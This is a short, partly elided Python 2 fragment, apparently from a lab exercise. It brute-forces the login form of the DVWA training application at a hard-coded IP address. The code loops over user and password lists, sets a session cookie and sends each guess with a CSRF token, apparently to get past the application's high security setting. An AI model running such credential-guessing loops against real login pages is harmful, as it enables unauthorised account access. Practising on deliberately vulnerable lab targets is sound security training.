    ...
    #Take the parameters and make requests
        for user in users:
            for password in passwords:
                ...
                url1 = "http://128.199.255.176/DVWA/vulnerabilities/brute/index.php"
                req = urllib2.Request(url1)
                req.add_header("Cookie", "security=high; PHPSESSID=n0s3ho4g9djjpdq561h5fgl4s5")
                ...
                url = "http://128.199.255.176/DVWA/vulnerabilities/brute/index.php?username=%s&password=%s&Login=Login&user_token=%s#" %(user,password,csrf_token)
